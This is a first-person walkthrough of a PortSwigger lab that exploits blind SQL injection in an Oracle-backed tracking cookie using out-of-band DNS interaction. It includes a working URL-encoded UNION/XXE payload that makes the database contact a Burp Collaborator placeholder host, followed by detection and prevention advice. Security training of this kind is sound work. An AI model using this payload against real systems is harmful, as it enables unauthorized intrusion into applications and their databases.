## Introduction

This lab demonstrates how a blind SQL injection vulnerability can be exploited using out-of-band (OAST) techniques.

The application uses a tracking cookie to collect information about user activity. The cookie value is included in an SQL query, but the query runs asynchronously. Its result does not affect the response returned to the browser.

Because of this, I cannot rely on the usual methods of detecting SQL injection, such as checking the page content, looking for database errors, or measuring response time.

To solve the lab, I used Burp Collaborator to generate a unique domain and modified the `TrackingId` cookie with an Oracle-specific SQL injection payload. When the database triggered a DNS lookup for the Collaborator domain, I could observe the interaction and confirm that the injection worked.

## Why This Attack Works

The application directly uses the value of the `TrackingId` cookie in a database query without safely separating the input from the SQL statement.

The query runs asynchronously, meaning that the database operation does not affect the response returned to the browser. Therefore, even if the injected SQL causes an external network interaction, the page may look completely normal.

I used an out-of-band technique to detect this behavior. Instead of looking for a change in the HTTP response, I made the injected query trigger a DNS lookup for a unique domain generated by Burp Collaborator.

When Collaborator received the DNS interaction, it provided evidence that the database had attempted to access the external domain.

The lab uses an Oracle database, so the payload uses Oracle-specific functions, including `EXTRACTVALUE()`, `XMLTYPE()` and `dual`.

## Step 1 - Launching the Lab and Finding the Injection Point

First, I opened PortSwigger Web Security Academy and launched the **Blind SQL injection with out-of-band interaction** lab.

I opened the target application in Firefox and used Burp Suite to capture the HTTP request.

After browsing the application, I checked the request headers and found a cookie named `TrackingId`.

The request contained a cookie similar to this:

```http
GET / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: TrackingId=YOUR-TRACKING-ID; session=YOUR-SESSION-ID
```

The values above are examples. My actual lab ID, tracking ID and session cookie were different.

The `TrackingId` cookie was important because the application used its value in an SQL query.

In a vulnerable application, a query might look similar to this:

```sql
SELECT trackingId
FROM someTable
WHERE trackingId = 'YOUR-TRACKING-ID';
```

This is an example of the possible query structure, not a confirmed copy of the application's actual SQL statement.

Since the cookie value was included in the query, I selected it as the injection point.

I could not rely on a visible database error or a change in the page response to confirm the vulnerability, so I continued with an out-of-band testing method.

## Step 4 - Injecting the Payload into the TrackingId Cookie

The lab uses Oracle, so I used an Oracle-specific payload to trigger an external DNS lookup.

The payload provided by PortSwigger is:

```sql
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

I replaced `BURP-COLLABORATOR-SUBDOMAIN` with my generated Collaborator payload by using Burp Suite's **Insert Collaborator payload** option.

The payload was inserted into the `TrackingId` cookie value in Repeater.

The following table explains the important parts of the payload.

| Part | Explanation |
|---|---|
| `x'` | Provides a value and quote intended to close the existing SQL string. |
| `UNION SELECT` | Adds another query to the original SQL statement. |
| `EXTRACTVALUE()` | An Oracle XML function used in this payload to process an XML expression. |
| `XMLTYPE()` | Converts the supplied XML text into an Oracle XML value. |
| `DOCTYPE` | Declares the document type in the XML input. |
| `ENTITY` | Declares an XML entity that references an external resource. |
| `BURP-COLLABORATOR-SUBDOMAIN` | Placeholder for the unique domain generated by Burp Collaborator. |
| `FROM dual` | Uses Oracle's built-in `dual` table, commonly used when selecting an expression without querying an application table. |
| `--` | Attempts to comment out the remaining part of the original SQL statement. |

The XML entity references the external Collaborator domain. When the database processes the injected expression in a vulnerable configuration, it may attempt to resolve that external resource, causing a DNS lookup.

The payload is specific to the SQL and XML behavior involved in this lab. It is not a universal payload for every database.

After checking the request, I sent it from Repeater.

The browser response did not need to show the result of the SQL query. The next step was to check whether the external interaction had occurred.

## Step 5 - Checking for DNS Interaction

After sending the modified request, I returned to the **Collaborator** tab.

I clicked **Poll now** to check for any interactions recorded by the Collaborator server.

Because the SQL query runs asynchronously, the DNS interaction might not appear immediately. If no interaction appeared at first, I waited briefly and checked again.

When the database attempted to resolve the unique Collaborator domain, the DNS interaction appeared in the results.

<p align="center">
  <img src="images/step5-1.png" width="600">
</p>

This was the important observation in the lab.

The application response itself did not provide a useful signal, but the external DNS interaction showed that the injected input had caused an out-of-band network lookup.

A DNS interaction alone does not prove that data was extracted from the database. In this lab, the goal was to trigger the interaction, not to retrieve database credentials.

After triggering the DNS lookup, I returned to the PortSwigger lab page and checked the lab status.

## How Defenders Can Catch This

- Monitor database servers for unexpected DNS lookups and connections to external domains.
- Investigate database queries that contain unexpected SQL statements, XML functions or external resource references.
- Review application and database logs for unusual input in tracking cookies and other request parameters.
- Monitor outbound DNS traffic and investigate requests to unknown or newly observed domains.
- Use network monitoring and DNS filtering to restrict unnecessary external lookups.
- Test applications for blind SQL injection, including cases where the HTTP response does not change.
- Do not rely only on error messages or unusual response times to detect SQL injection.

## How to Prevent It

- Use parameterized queries or prepared statements instead of building SQL statements through string concatenation.
- Treat cookie values as untrusted input, even when they are generated by the application.
- Avoid processing user-controlled input as part of executable SQL statements.
- Disable unnecessary database features and restrict permissions for the database account used by the application.
- Restrict outbound network access from database servers to only the destinations and services that are required.
- Disable external XML entity processing when it is not needed and configure XML parsers securely.
- Monitor database and network activity for unexpected external requests.
- Test the application regularly for SQL injection and other input-handling vulnerabilities.

## Lessons Learned

During this lab, I learned how out-of-band techniques can help detect blind SQL injection when the application's response does not reveal the result of a query.

- Blind SQL injection does not always produce visible changes in the HTTP response.
- Asynchronous database queries can make response-based and time-based testing ineffective.
- Burp Collaborator can detect external interactions caused by injected input.
- DNS lookups can provide evidence of a vulnerability when the application does not return query results.
- Oracle-specific functions and syntax may be needed when testing an Oracle database.
- A successful DNS interaction does not automatically mean that sensitive data has been extracted.
- Parameterized queries and restricted database permissions help prevent SQL injection, while outbound network controls can reduce the impact of out-of-band attacks.

This lab helped me understand why checking only the HTTP response is not always enough when testing web applications for SQL injection.
